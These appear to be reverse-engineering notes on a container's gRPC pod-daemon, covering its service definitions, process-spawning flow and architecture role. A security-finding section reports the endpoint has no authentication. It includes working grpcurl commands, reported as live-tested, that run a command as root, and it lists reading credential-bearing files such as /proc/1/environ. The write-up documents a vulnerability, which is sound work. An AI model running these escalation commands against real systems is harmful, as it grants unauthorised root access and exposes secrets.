# Binary: /pod-daemon (Rust, statically linked with musl)
# PID: 1 (init process of container)
# Port: 26500 (gRPC, tonic 0.13.1)

## Service Definition

### anyrun.v1.PodDaemonService
  rpc CreateProcess(CreateProcessRequest) returns (CreateProcessResponse);  # Unary
  rpc AttachProcess(AttachProcessRequest) returns (stream ProcessEvent);    # Server-streaming

### CreateProcessRequest (confirmed field order via brute-force testing)
  string command = 1;           # Executable path (NOT shell-parsed)
  string user = 2;              # Username (resolved via getpwnam_r)
  string working_directory = 3; # cd <working_dir> && before exec
  map<string, string> env = 4;  # Additional environment variables
  # Auto-injected env: HOME, PATH, SHELL, USER (from passwd)

### CreateProcessResponse
  uint64 process_id = 1;  # Auto-incrementing process ID (varint, not string)

### AttachProcessRequest
  uint64 process_id = 1;
  int64 last_event_id = 2;  # For replay from specific event

### ProcessEvent
  int64 event_id = 1;
  oneof event {
    bytes stdout = 2;
    bytes stderr = 3;
    int32 exit_code = 4;  # Set when process exits
  }

## CRITICAL SECURITY FINDING: Privilege Escalation
The PodDaemonService has NO authentication on its gRPC endpoint.
Any process in the container can connect to localhost:26500 and:
  1. Run commands as ANY user (including root)
  2. Read ANY file via root-privileged processes
  3. Access /proc/1/environ, /proc/1/maps (normally root-only)

LIVE TEST - Root Escalation:
  $ grpcurl -plaintext -d '{"command":"id","user":"root","working_directory":"/"}' \
      localhost:26500 anyrun.v1.PodDaemonService/CreateProcess
  -> {"processId":"15"}

  $ grpcurl -plaintext -d '{"process_id":"15"}' \
      localhost:26500 anyrun.v1.PodDaemonService/AttachProcess
  -> stdout: "uid=0(root) gid=0(root) groups=0(root)"

## Process Execution Flow (from process_manager.rs strings)
  1. Resolve user via getpwnam_r -> uid, gid, home, shell
  2. Validate command is not empty
  3. Build Command: cd <working_dir> && HOME=<home> PATH=<path> SHELL=<shell> USER=<user> <command>
  4. Default PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  5. Spawn with kill_on_drop: true
  6. Capture stdout and stderr via separate readers
  7. Insert events into stream buffer
  8. On exit: log exit code, insert exit event

## Pod-Daemon's Role in Architecture
  1. PID 1 (init) of the container
  2. Spawned by the orchestrator (vm-orchestrator at 192.168.24.21)
  3. Receives inbound gRPC from orchestrator on port 26500
  4. Spawns exec-daemon as a child process with full CLI flags
  5. Provides process execution for the orchestrator (CreateProcess/AttachProcess)
